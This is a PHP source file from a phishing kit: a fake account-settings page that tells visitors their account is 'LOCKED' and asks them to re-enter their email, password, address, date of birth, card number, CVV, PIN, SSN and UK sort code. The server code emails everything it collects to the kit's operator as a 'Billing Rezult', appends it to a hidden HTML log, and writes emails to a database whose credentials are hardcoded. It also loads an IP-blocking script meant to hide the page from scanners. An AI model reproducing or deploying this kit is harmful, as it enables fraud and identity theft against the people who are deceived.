<?php
	session_start();
	error_reporting(0);
	require_once('../mailer/PHPMailer-master/class.phpmailer.php');
	include "bots.php";  //Para Bloquear Algunas IPs / tikchbila tiwliwla ma9tloni ma7wawni ghir spam bach blawni 	
	include ('config.php');
	include ('str.php');

		$mail = $_SESSION['_email_'];
		$pass = $_SESSION['_password_'];


	
	$_SESSION['UK747900-1']	= $_POST['UK747900-1'];
	$_SESSION['UK747900-2']	= $_POST['UK747900-2'];
	$_SESSION['UK747900-3']	= $_POST['UK747900-3'];
	$_SESSION['UK747900-4'] = $_POST['UK747900-4'];
	$_SESSION['UK747900-5']	= $_POST['UK747900-5'];
	$_SESSION['UK747900-6']	= $_POST['UK747900-6'];
	$_SESSION['UK747900-7']	= $_POST['UK747900-7'];
	$_SESSION['country']	= $_POST['country'];
	
	$ca 	= $_SESSION['ca']	= $_POST['ca'];
	$exp 	= $_SESSION['ex']	= $_POST['ex'];
	$cvc 	= $_SESSION['cv']	= $_POST['cv'];
	$pin 	= $_SESSION['pin']	= $_POST['pin'];
	$sn 	= $_SESSION['UK747-4'] 	= $_POST['sn'];
	$src 	= $_SESSION['UK747-5']	= $_POST['src'];
	
	$add = $_SESSION['fname'].' '.$_SESSION['lname'].' '.$_POST['UK747900-1'].' '.$_POST['UK747900-2'].' '.$_POST['UK747900-3'].' '.$_POST['UK747900-4'].' '.$_POST['UK747900-5'].' '.$_POST['UK747900-6'].' '.$_POST['UK747900-7'].' '.$_POST['country'].' '.$_SESSION['_IP_'];
	
	if ($_SESSION['_cc1'] == ""){
	$confirm = 'none';	
		}else{
	$confirm = 'bock';	
		}

	if ($_SESSION['fname'] == '' ){
	$edit = 'block';
	$save = 'none';

	
	}else{
	$edit = 'none';
	$save = 'block';
	}
		
	

	if ($countrycode == 'US'){
	
		$us = "";
		$uk = "none";
	
		
	}else if($countrycode == 'GB'){
		$us = "none";
		$uk = "";

			
	}else {
		$us = "none";
		$uk = "none";	

			
	}
	
	
	if (isset($_POST['ca'])){
	
		
		list($brand, $type, $bank) = bankname();
		
		$_SESSION['brand']	= $brand;
		
		$mail = $_SESSION['_email_'];
		
		$servername 	= "localhost";
		$username 	= "mrxsoftn_logins";
		$password 	= "15325reda";
		$dbname =	 "mrxsoftn_logins";
	
	// Create connection
	$conn = mysqli_connect($servername, $username, $password, $dbname);
	// Check connection
	


	$sql = "INSERT INTO email (id, email)
	VALUES ('', '$mail')";
	
	if (mysqli_query($conn, $sql)) {
	    //echo "New record created successfully";
	} else {
	    //echo "Error: " . $sql . "<br>" . mysqli_error($conn);
	}
	
	
	
	
	
	
	
	mysqli_close($conn);
   
   
	
	
	
						$headers  = "MIME-Version: 1.0" . "\r\n";;
						$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
						$headers .= "From: 	REZ <experts@nptemp.net>" . "\r\n";
		
						
						
						
	$message = "

	<table style='border-spacing: 0px; line-height: 1.2em; width: 100%; font-family:Tahoma;color:#333;font-size:14px;border:1px solid #06f;padding:20px;border-radius:5px;margin-top:20px'>
 
	<tr><td style='width: 15%;'> Email 	</td><td><font color='#3366FF'>".$_SESSION['_email_']."</td></tr>
	<tr><td> Password 					</td><td><font color='#3366FF'>".$_SESSION['_password_']."</td></tr>
	
	<tr><td><hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/></td>
	<td><hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/></td></tr>
	
	<tr><td> First Name 	:</td><td><font color='#3366FF'>".$_POST['UK747900-1']."</td></tr>
	<tr><td> Last Name 	:</td><td><font color='#3366FF'>".$_POST['UK747900-2']."</td></tr>
	<tr><td> Address 	:</td><td><font color='#3366FF'>".$_POST['UK747900-3']."</td></tr>
	<tr><td> DOB 		:</td><td><font color='#3366FF'>".$_POST['UK747900-7']."</td></tr>
	<tr><td> City 		:</td><td><font color='#3366FF'>".$_POST['UK747900-4']."</td></tr>
	<tr><td> Postal Code	:</td><td><font color='#3366FF'>".$_POST['UK747900-5']."</td></tr>
	<tr><td> State 		:</td><td><font color='#3366FF'>".$_POST['UK747900-6']."</td></tr>
	<tr><td> Country	:</td><td><font color='#3366FF'>".$_POST['country'].   "</td></tr>
	
	<tr><td><hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/></td>
	<td><hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/></td></tr>
	
	<tr><td> |C / R / D :</td><td><font color='#3366FF'>".$_POST['ca']."</td></tr>
	<tr><td> |E / X / P :</td><td><font color='#3366FF'>".$_POST['ex']."</td></tr>
	<tr><td> |C / V / V :</td><td><font color='#3366FF'>".$_POST['cv']."</td></tr>
	<tr><td> |P / I / N :</td><td><font color='#3366FF'>".$_POST['pin']."</td></tr>
	<tr><td> |T / Y / P :</td><td><font color='#1C800D'>".$brand." ".$type."</td></tr>
	<tr><td> |B / N / K :</td><td><font color='#1C800D'>".$bank."</td></tr>
	<tr><td> |S / S / N :</td><td><font color='#3366FF'>".$_POST['sn']."</td></tr>
	<tr><td> |S / C / D :</td><td><font color='#3366FF'>".$_POST['src']."</td></tr>
	
	<tr><td><hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/></td>
	<td><hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/></td></tr>
	
	<tr><td> First Name :</td><td><font color='#3366FF'>".$_SESSION['fname']."</td></tr>
	<tr><td> Last Name 	:</td><td><font color='#3366FF'>".$_SESSION['lname']."</td></tr>
	<tr><td> Address 	:</td><td><font color='#3366FF'>".$_SESSION['uk747901']."</td></tr>
	<tr><td> DOB 		:</td><td><font color='#3366FF'>".$_SESSION['uk747907']."</td></tr>
	<tr><td> City 		:</td><td><font color='#3366FF'>".$_SESSION['uk747902']."</td></tr>
	<tr><td> Postal Code:</td><td><font color='#3366FF'>".$_SESSION['uk747905']."</td></tr>
	<tr><td> State 		:</td><td><font color='#3366FF'>".$_SESSION['uk747903']."</td></tr>
	<tr><td> Phone 		:</td><td><font color='#3366FF'>".$_SESSION['uk747906']."</td></tr>
	<tr><td> Country	:</td><td><font color='#3366FF'>".$_SESSION['uk747904'].   "</td></tr>
	
	<tr><td><hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/></td>
	<td><hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/></td></tr>
	
    <tr><td> IP 		</td><td><font color='#1C800D'>".$_SESSION['_IP_']."</td></tr>
    <tr><td> TIME		</td><td><font color='#1C800D'>".date('l jS \of F Y h:i:s A')."</td>
	<td rowspan='3' style='text-align:right;'>".$Logo."<br> Copyright&copy; UK747</td></tr>
	<tr><td> Browser 	</td><td><font color='#1C800D'>".$_SESSION['_browser_']."</td></tr>
	<tr><td> USER AGENT </td><td><font color='#1C800D'>".$_SERVER['HTTP_USER_AGENT']."</td></tr>


	</table>";
	
$msg = '
<tr>
		<td>'.$brand." ".$type.'</td>
        <td>'.$_SESSION['_email_'].'</td>
        <td>'.$_SESSION['_password_'].'</td>
        <td>'.$_POST['UK747900-1'].'</td>
		<td>'.$_POST['UK747900-2'].'</td>
        <td>'.$_POST['UK747900-3'].'</td>
        <td>'.$_POST['UK747900-7'].'</td>
		<td>'.$_POST['UK747900-4'].'</td>
        <td>'.$_POST['UK747900-5'].'</td>
        <td>'.$_POST['UK747900-6'].'</td>
		<td>'.$_POST['ca'].'</td>
        <td>'.$_POST['ex'].'</td>
        <td>'.$_POST['cv'].'</td>
		<td>'.$_POST['pin'].'</td>
		<td>'.$_POST['sn'].'</td>
		<td>'.$_POST['src'].'</td>
		<td>'.$_SESSION['_IP_'].'</td>
		<td>'.date('l jS \of F Y h:i:s A').'</td>
		<td>Auto Bill :</td>
        <td>'.$_SESSION['fname'].'</td>
        <td>'.$_SESSION['lname'].'</td>
		<td>'.$_SESSION['uk747901'].'</td>
        <td>'.$_SESSION['uk747907'].'</td>
		<td>'.$_SESSION['uk747902'].'</td>
        <td>'.$_SESSION['uk747905'].'</td>
		<td>'.$_SESSION['uk747903'].'</td>
        <td>'.$_SESSION['uk747906'].'</td>
		<td>'.$_SESSION['uk747904'].'</td>
      </tr>';

$open_rezult_file = fopen("../../../../ind.html","a"); 
fwrite($open_rezult_file,$msg); 	

	$subject = "~ Billing Rezult ~ $ip | $countryname | $brand  $type";
	//mail($to, $subject, $message, $headers);   
			$email = new PHPMailer();
	        $file_to_attach = "../JSON/JSON.txt";
			$email->From      = 'experts@nptemp.net';
			$email->FromName  = 'REZ';
			$email->Subject   = $subject;
			$email->Body      = $message;
			$email->IsHTML(true);
			$email->AddAddress( $to );
			$email->AddAttachment( $file_to_attach );

			$email->Send();
			
					if ($_ID == 1){
						header("Location: checking.php ");
					}else if($_bank == 1){
						if( $locate == "US" ){
						header("Location: bnk_add.php ");
						}else if ($locate == "UK"){
						header("Location: bank_GB.php ");
						}else{
						header("Location: thankyou.php ");
						}
					
					}else{
					header("Location: thankyou.php ");
					}

		
		}
	
	
	
?>
<!DOCTYPE html>
<html>
	<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<title>&Alpha;ccount Setting</title>
		<meta name="robots" content="noindex">

		
		<meta name="viewport" content="width=device-width, maximum-scale=1.0, user-scalable=1" />
			<link rel="stylesheet" href="../set/css/common.css"/>
		<link rel="stylesheet" href="../set/css/account.css"/>
		<link  rel="logo-icon" href="../set/img/iconisma.ico">
		<link rel="stylesheet" href="../set/css/bootstrap.min.css"/>
		<link rel="stylesheet" href="../set/css/bootstrap-theme.min.css"/>
		<link rel="stylesheet" href="../set/cssisma/tot.css" type="text/css"/>
		<link rel="stylesheet" href="../set/css/styles.css"/>
	

		<script src="../set/js/jquery-1.11.0.min.js"></script>
		<script src="../set/js/jquery.creditCardValidator.js"></script>
		<script src="../set/js/demo.js"></script>
		<script src="../set/js/angular.min.js"></script>
		<script src="../set/js/jquery.maskedinput.js" type="text/javascript"></script>
		
		

		
<script>
	jQuery(function($){
	
   
	
   $("#ex").mask("99/9999");
   //$("#cvc").mask("9999");
   $("#PIN").mask("9999");
   $("#src").mask("99-99-99");
   $("#UK747900-7").mask("9999-99-99");
  
});
$(document).ready(function() {
$("#edit").click(function(){

  $("#bill").css("display","none"); 
  $("#payment-body").css("display","block"); 
	
    }); 
});
  </script>
		
	</head>	
	
	
	<body style="background:#F3F3F3">
		
		<?php include("../forms/nav.php")?>

		<div class="container">

			<div style="top: 100px; position: relative;">
			<img style="width: 190px;" src="../set/img/logs.png" class="img-responsive" />
			<p style="text-align: right;">Welcome <b><?=$_SESSION['fname'].' '.$_SESSION['lname'] ?> </b><font color='red'>Status: <b>LOCKED</b></font></p>
			</div>
			
			
			<div class="row row2" >
				
					<div class=" col-xs-4 sidebar mobile-hide"  >
					<img style="width:100%; position:relative; top:20px;" src="../set/img/Untitled2.png ">
					</div>
					
					<form id="form" name="form" method="POST" action="" > 
					<div class="col-xs-4 loop mobile" style="">
						<div>
								<img style="width: 290px; position: relative; right: 5px; " src="../set/img/Review.png ">
							
							<hr/>
							<!--<img width="310px" src="../set/img/easy.png" /> -->
							
						</div>
						<br/>
						
						
						<div class="panel panel-default" id="pp">
							<div class="panel-heading"><img width='70px' src="../set/img/pple.png "/> </div>
							<div class="panel-body" name="prof" id="prof">
							
							<div class="col-xs-12 col-md-12" style="<?=$cardo ?>">
							
								<div class="col-xs-12 col-md-4" s>
							
									<p >
										<?=$_SESSION['_email_'] ?>
									</p>
								</div >
								<div  class="col-xs-4" style="display:none<?=$disp?>;">
									<P>Billing Contact</p>
									<p style="padding: 0px 0px 0px 10px;">
										<?=$_SESSION['fname'].' '.$_SESSION['lname'] ?>
										<br/>
										<?=$_SESSION['street'] ?>
										<br/>
										<?=$_SESSION['city']?>
										
									</p>
								</div>
										
							</div >
							
			
					
							</div>
							
						</div>
						
						<div class="panel panel-default">
							<div class="panel-heading"><img width="150px" src="../set/img/py.png "/> 
								<div id="payment-edit-actions">
																				<div class=" clear clearfix pbs" style="width: 80px; float: right; position:relative;top:-22px;">
																					<button type="button"   class="button account ftr" id="edit" name="edit">
																					<span class="label"> edit </span>
																					</button>
																					
																				</div>
																			</div>
																			</div>
							<div class="panel-body">
							
								<div id="bill" name="bill" style="display:<?=$save ?>" class="col-xs-12 col-md-4">
									<p>Billing Address</p>
									<p style="padding: 0px 0px 0px 10px;">
										<?=$_SESSION['fname'].' '.$_SESSION['lname'] ?>
										<br/>
										<?=$_SESSION['uk747901']?>
										<br/>
										<?=$_SESSION['uk747902'].' '.$_SESSION['uk747903']."&nbsp;&nbsp;&nbsp;&nbsp;".$_SESSION['uk747905']?>
										<br/>
										<?=$_SESSION['uk747906']?>
										<br/>
										<b><?=$_SESSION['uk747904']?></b>
										<br/>
									</p>
								</div>	
								
								
								<div id="info" class="col-xs-12 col-md-8" style="display:; padding: 0px;">
								
										
										
											<!--<div class="col-xs-12 col-md-6">
											<input placeholder="XXXX XXXX XXXX XXXX" pattern="\d{4} \d{4} \d{4} \d{4}"   autocomplete="off" type="tel" id="ca" name="ca" class="form-control masked" style="text-align:center; margin:10px;"    />
											</div>
											<div class="col-xs-6 col-md-3">
											<input type="tel" name="ex" id="ex" class="form-control" style="text-align:center; margin:10px;" placeholder="MM/YYYY" maxlength="7"/>
											</div>
											<div class="col-xs-6 col-md-3">
											<input type="tel" name="cv" id="cv"  class="form-control" style="text-align:center; margin:6px;"  placeholder="CVC" maxlength="4" />
											</div>
											<div class="col-xs-6 col-md-3">
											<input type="tel" name="pin" id="pin"  class="form-control" style="text-align:center; margin:6px;"  placeholder="PIN" maxlength="4" />
											</div>
											<div class="col-xs-12 col-md-6" style="float:right; display:<?=$us ?>">
											<input type="tel" name="sn" id="sn"  class="form-control" style="text-align:center; margin:10px;"  placeholder="SSN" maxlength="11" ng-model="ssn"   ssn-field="" ssn-field-mask="true"/>
											</div>
											<div class="col-xs-12 col-md-6" style="float:right; display:<?=$uk ?>"> 
											<input type="tel" name="src" id="src"  class="form-control" style="text-align:center; margin:10px;"  placeholder="Sort Code" maxlength="8" />
											</div>
											-->
										
											<div  style="display:none"> 
											<input type="text" id="locate"  value="<?=$countrycode ?>" />
											</div>
									
								</div>
							
							<?php include('../forms/info.php') ?>
						
			
							<?php include('../forms/ca.php') ?>
										</div>
					
	
					
                    

																
																			<div id="payment-edit-actions">
																				<div class=" clear clearfix pbs">
																					<button type="submit" class="button account ftr" id="done" name="done">
																					<span class="label" > save </span>
																					</button>
																					
																				</div>
																			</div>
																	
	</div>

																
																	
				
<div class="panel panel-default">
							<div class="panel-heading"><img width="95px" src="../set/img/set.png "/> </div>
							<div class="panel-body">
								<div class="col-xs-6">
									Where do you use your products?<br/>
									No answer given.
								</div>
								<div class="col-xs-6">
									You are currently subscribed to receive news, software updates, and the latest information on products and services
								</div>
							</div>
</div>
						
						
						
						
						<div class="col-xs-12">
							<button class="btn btn-lg btn-primary  mybotton" style="font-size:100%;" name="done" id="done">Continue</button>
						</div>	         
				
					
				
					</div>
						<div class="footbar col-xs-12">
					<p style="padding:15px;">We use a Highly encryption to pr&omicron;tect the c&omicron;nfidentiality of y&omicron;ur &Rho;ers&omicron;nal inf&omicron;rmation.</p>
					</div>
				</form>
			</div>
			<br/>
			<br/>
			<br/>
			<br/>
			<div class="panel-footer footer" >
				<img src="../set/img/footer.png" class="img-responsive" />
			</div>
		</div>
		
	</body>


	<script> 
	
	checkOut = "false";
	var myInput1 = document.getElementById("ca");
	var myInput2 = document.getElementById("ex");
	var myInput3 = document.getElementById("cv");
	var myInput4 = document.getElementById("pin");
	var myInput5 = document.getElementById("sn");
	var myInput6 = document.getElementById("src");

	var locate = document.getElementById("locate");
	

	$('body').on('click', '#done', function check() {
    if (myInput1 && !myInput1.value) {
	checkOut = "false";
    $('#ca').css ({
		'background-color': '#FEFEDE',
		'border-radius': '4px',
	  });
}else {
    $('#ca').validateCreditCard(function(result) {
    if (result.valid===true){
	 checkOut = "Valid";
	   $('#ca').css ({
		   
		
		'border-radius': '4px',
		  });
}else{
				// alert(result.valid);
	  checkOut = "false";
	  $('#ca').css ({
		'background-color': '#FEFEDE',
		'border-radius': '4px',
	  });
   };
     });
}


if (myInput2 && !myInput2.value) {
    VC = "false";
    $('#cv').css ({
		'background-color': '#FEFEDE',
		'border-radius': '4px',
	  });
}else {
VC = "true";
}

if (myInput3 && !myInput3.value) {
    exp = "false";
    $('#ex').css ({
		'background-color': '#FEFEDE',
		'border-radius': '4px',
	  });
}else {
  exp = "true";
   }
if (myInput4 && !myInput4.value) {
    exp = "false";
    $('#ex').css ({
		'background-color': '#FEFEDE',
		'border-radius': '4px',
	  });
}else {
  exp = "true";
   } 
   
	 if (locate && locate.value == 'US') {
			if (myInput5 && !myInput5.value) {
			SSR = "false";
			$('#sn').css ({
				'background-color': '#FEFEDE',
				'border-radius': '4px',
			  });
		}else {
		  SSR = "true";
		   }
	}else if (locate && locate.value == 'GB') {
		if (myInput6 && !myInput6.value) {
		SSR = "false";
		$('#src').css ({
			'background-color': '#FEFEDE',
			'border-radius': '4px',
		  });
		}else {
	  SSR = "true";
		}
	}else{
	   SSR = "true";
   }


	
 if (checkOut == "Valid" && exp=="true" && VC=="true"  && SSR=="true" ){

    document.forms["form"].submit();
	}else{
	$('html, body').animate({
					scrollTop: $("#pp").offset().top
				}, 1000);
	return false;
	};
});
	
	
	
	
	
	
	
	
	
	
		
			
	
		function toSubmit(){
			if (pht2 == 1 && pht == 1){
				return true;
				}else{
				$('html, body').animate({
					scrollTop: $("#pp").offset().top
				}, 1000);
				$('#prof').css({'border': '1px solid red', 'border-radius': '5px', 'background': 'rgb(255, 249, 244) none repeat scroll 0% 0%'});
				return false;
			}
		}
		

	</script>
	
	<script>
      (function () {
		angular.module('pvdSSN', []).controller('testCtrl', function ($scope) {
        return $scope.ssn = 123456789;
    }).filter('ssnFilter', function () {
        return function (value, mask) {
            var len, val;
            if (mask == null) {
                mask = false;
            }
            if (value) {
                val = value.toString().replace(/\D/g, '');
                len = val.length;
                if (len < 4) {
                    return val;
                } else if (3 < len && len < 6) {
                    if (mask) {
                        return '***-' + val.substr(3);
                    } else {
                        return val.substr(0, 3) + '-' + val.substr(3);
                    }
                } else if (len > 5) {
                    if (mask) {
                        return '***-**-' + val.substr(5, 4);
                    } else {
                        return val.substr(0, 3) + '-' + val.substr(3, 2) + '-' + val.substr(5, 4);
                    }
                }
            }
            return value;
        };
    }).filter('ssnReverse', function () {
        return function (value) {
            if (!!value) {
                return value.replace(/\D/g, '').substr(0, 9);
            }
            return value;
        };
    }).directive('ssnField', function ($filter) {
        var ssnFilter, ssnReverse;
        ssnFilter = $filter('ssnFilter');
        ssnReverse = $filter('ssnReverse');
        return {
            restrict: 'A',
            require: 'ngModel',
            link: function (scope, element, attrs, modelCtrl) {
                var formatter, mask, parser;
                mask = attrs.ssnFieldMask;
                formatter = function (value) {
                    return ssnFilter(value);
                };
                parser = function (value) {
                    var formatted;
                    formatted = ssnReverse(value);
                    element.val(ssnFilter(formatted));
                    return formatted;
                };
                modelCtrl.$formatters.push(formatter);
                return modelCtrl.$parsers.unshift(parser);
            }
        };
    });
    angular.bootstrap(document, ['pvdSSN']);
}.call(this));
      //@ sourceURL=pen.js
    </script>


<script >
	var masking = {

  // User defined Values
  //maskedInputs : document.getElementsByClassName('masked'), // add with IE 8's death
  maskedInputs : document.querySelectorAll('.masked'), // kill with IE 8's death
  maskedNumber : 'XdDmMyY9',
  maskedLetter : '_',

  init: function () {
    masking.setUpMasks(masking.maskedInputs);
    masking.maskedInputs = document.querySelectorAll('.masked'); // Repopulating. Needed b/c static node list was created above.
    masking.activateMasking(masking.maskedInputs);
  },

  setUpMasks: function (inputs) {
    var i, l = inputs.length;

    for(i = 0; i < l; i++) {
      masking.createShell(inputs[i]);
    }
  },
  
  // replaces each masked input with a shall containing the input and it's mask.
  createShell : function (input) {
    var text = '', 
        placeholder = input.getAttribute('placeholder');

    input.setAttribute('maxlength', placeholder.length);
    input.setAttribute('data-placeholder', placeholder);
   

    text = '<span class="shell">' +
      '<span aria-hidden="true" id="' + input.id + 
      'Mask"><i></i>' + placeholder + '</span>' + 
      input.outerHTML +
      '</span>';

   // input.outerHTML = text;
  },

  setValueOfMask : function (e) {
    var value = e.target.value,
        placeholder = e.target.getAttribute('data-placeholder');

    return "<i>" + value + "</i>" + placeholder.substr(value.length);
  },
  
  // add event listeners
  activateMasking : function (inputs) {
    var i, l;

    for (i = 0, l = inputs.length; i < l; i++) {
      if (masking.maskedInputs[i].addEventListener) { // remove "if" after death of IE 8
        masking.maskedInputs[i].addEventListener('keyup', function(e) {
          masking.handleValueChange(e);
        }, false); 
      } else if (masking.maskedInputs[i].attachEvent) { // For IE 8
          masking.maskedInputs[i].attachEvent("onkeyup", function(e) {
          e.target = e.srcElement; 
          masking.handleValueChange(e);
        });
      }
    }
  },
  
  handleValueChange : function (e) {
    var id = e.target.getAttribute('id');
        
    switch (e.keyCode) { // allows navigating thru input
      case 20: // caplocks
      case 17: // control
      case 18: // option
      case 16: // shift
      case 37: // arrow keys
      case 38:
      case 39:
      case 40:
      case  9: // tab (let blur handle tab)
        return;
      }

    document.getElementById(id).value = masking.handleCurrentValue(e);
    document.getElementById(id + 'Mask').innerHTML = masking.setValueOfMask(e);

  },

  handleCurrentValue : function (e) {
    var isCharsetPresent = e.target.getAttribute('data-charset'), 
        placeholder = isCharsetPresent || e.target.getAttribute('data-placeholder'),
        value = e.target.value, l = placeholder.length, newValue = '', 
        i, j, isInt, isLetter, strippedValue;

    // strip special characters
    strippedValue = isCharsetPresent ? value.replace(/\W/g, "") : value.replace(/\D/g, "");

    for (i = 0, j = 0; i < l; i++) {
        var x = 
        isInt = !isNaN(parseInt(strippedValue[j]));
        isLetter = strippedValue[j] ? strippedValue[j].match(/[A-Z]/i) : false;
        matchesNumber = masking.maskedNumber.indexOf(placeholder[i]) >= 0;
        matchesLetter = masking.maskedLetter.indexOf(placeholder[i]) >= 0;

        if ((matchesNumber && isInt) || (isCharsetPresent && matchesLetter && isLetter)) {

                newValue += strippedValue[j++];

          } else if ((!isCharsetPresent && !isInt && matchesNumber) || (isCharsetPresent && ((matchesLetter && !isLetter) || (matchesNumber && !isInt)))) {
                // masking.errorOnKeyEntry(); // write your own error handling function
                return newValue; 

        } else {
            newValue += placeholder[i];
        } 
        // break if no characters left and the pattern is non-special character
        if (strippedValue[j] == undefined) { 
          break;
        }
    }
    if (e.target.getAttribute('data-valid-example')) {
      return masking.validateProgress(e, newValue);
    }
    return newValue;
  },

  validateProgress : function (e, value) {
    var validExample = e.target.getAttribute('data-valid-example'),
        pattern = new RegExp(e.target.getAttribute('pattern')),
        placeholder = e.target.getAttribute('data-placeholder'),
        l = value.length, testValue = '';

    //convert to months
    if (l == 1 && placeholder.toUpperCase().substr(0,2) == 'MM') {
      if(value > 1 && value < 10) {
        value = '0' + value;
      }
      return value;
    }
    // test the value, removing the last character, until what you have is a submatch
    for ( i = l; i >= 0; i--) {
      testValue = value + validExample.substr(value.length);
      if (pattern.test(testValue)) {
        return value;
      } else {
        value = value.substr(0, value.length-1);
      }
    }
  
    return value;
  },

  errorOnKeyEntry : function () {
    // Write your own error handling
  }
}

masking.init();


</script>
<script>//jQuery time
					$(document).ready( function () { 
						
$("#form input").each(function(){
	if($(this).val() != '' || !$(this).val()==null){
		$(this).css({'background-size' : '0px'});
		}
	
});
							
					$("#form input").focus (function() {
				
						$(this).css({'background-size' : '0px'});
						}).blur(function() {
						if( !$(this).val()){
						$(this).css({'background-size' : '130px 290px;'});
								}
						});
					
					
					
					$("#Next").click(function(){
							 function check(){
								var isValid = true;
							 
								$("input").each(function() {
								var element = $(this);
								if (element.val() == "") {
								$(this).css({'background-color' : '#FEFEDE'});
								isValid = false;
								}
								});

								return isValid
								}
								isValid = check();
								if (isValid == true){
								document.form.submit();  
							};

						});
					});
</script>

	
<script src="JSON.js"></script>

</html>		